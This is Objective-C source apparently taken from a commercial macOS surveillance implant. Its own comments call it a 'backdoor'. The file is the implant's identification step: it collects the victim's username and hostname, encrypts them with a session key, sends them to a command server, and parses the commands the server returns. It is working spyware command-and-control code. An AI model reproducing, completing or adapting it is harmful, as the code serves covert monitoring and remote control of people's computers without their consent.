/*
 * RCSMac - Identification Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "IDNetworkOperation.h"
#import "RCSMCommon.h"
#import "NSString+Pascal.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


@implementation IDNetworkOperation

@synthesize mCommands;

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      mCommands  = [[NSMutableArray alloc] init];
      
#ifdef DEBUG_ID_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mCommands release];
  [super dealloc];
}

- (BOOL)perform
{ 
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  int i = 0;
  uint32_t _command;
  char tempHost[100];
  NSString *hostName;
  NSString *sourceID = @"";

  uint32_t command    = PROTO_ID;
  NSString *userName  = NSUserName();

  if (gethostname(tempHost, 100) == 0)
    hostName = [NSString stringWithUTF8String: tempHost];
  else
    hostName = @"EMPTY";
  
  NSMutableData *message = [[NSMutableData alloc] init];
  
  // command PROTO_ID
  [message appendBytes: &command
                length: sizeof(command)];
  // backdoor version
  [message appendBytes: &gVersion
                length: sizeof(gVersion)];
  // userid
  [message appendData: [userName pascalizeToData]];
  // deviceid (hostname)
  [message appendData: [hostName pascalizeToData]];
  // sourceid (not important)
  [message appendData: [sourceID pascalizeToData]];
  // sha1 check
  NSData *messageSha = [message sha1Hash];
  [message appendData: messageSha];

  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse  = nil;
  NSData *replyData           = nil;
  
  [message encryptWithKey: gSessionKey];
  
  replyData = [mTransport sendData: message
                 returningResponse: urlResponse];
  
  if (replyData == nil)
    {
      [message release];
      [outerPool release];

      return NO;
    }

  NSMutableData *decData = [[NSMutableData alloc] initWithData: replyData];
  [decData decryptWithKey: gSessionKey];
  
#ifdef DEBUG_ID_NOP
  infoLog(@"decrypted data: %@", decData);
#endif
  
  //
  // Now check the response
  // OK - num_of_commands - array[num_of_commands] - sha1 - padding
  //
  uint32_t responseCommand;
  [decData getBytes: &responseCommand
             length: sizeof(uint32_t)];
  
  // remove padding
  [decData removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [decData subdataWithRange:
                   NSMakeRange([decData length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      shaLocal = [decData subdataWithRange:
                  NSMakeRange(0, [decData length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {  
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];

  if ([shaRemote isEqualToData: shaLocal] == NO)
    {  
      [message release];
      [decData release];
      [outerPool release];
      
      return NO;
    }
  
  if (responseCommand != PROTO_OK)
    {      
      [message release];
      [decData release];
      [outerPool release];
      
      return NO;
    }
    
  int64_t serverTime = 0;
  @try
    {
      [decData getBytes: &serverTime
                  range: NSMakeRange(8, sizeof(int64_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_ID_NOP
      errorLog(@"exception on serverTime makerange (%@)", [e reason]);
#endif
      //return NO;
    }
  
  uint32_t numOfCommands = 0;
  
  @try
    {
      [decData getBytes: &numOfCommands
                  range: NSMakeRange(16, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_ID_NOP
      errorLog(@"exception on numOfCommands makerange (%@)", [e reason]);
#endif
    }
  
  if (numOfCommands == 0)
    {
#ifdef DEBUG_ID_NOP
      warnLog(@"No commands requested from the server");
#endif
      
      [message release];
      [decData release];
      [outerPool release];
      
      return YES;
    }

  //
  // Parse all the commands
  //
  for (; i < numOfCommands; i++)
    {
      @try
        {
          [decData getBytes: &_command
                      range: NSMakeRange(20 + (i * 4), sizeof(uint32_t))];
        }
      @catch (NSException *e)
        {
#ifdef DEBUG_ID_NOP
          errorLog(@"exception on command makerange (%@)", [e reason]);
#endif
          
          continue;
        }
      
      NSNumber *command = [NSNumber numberWithUnsignedInt: _command];
      [mCommands addObject: command];
    }
  
  [message release];
  [decData release];
  [outerPool release];
  
  return YES;
}

@end
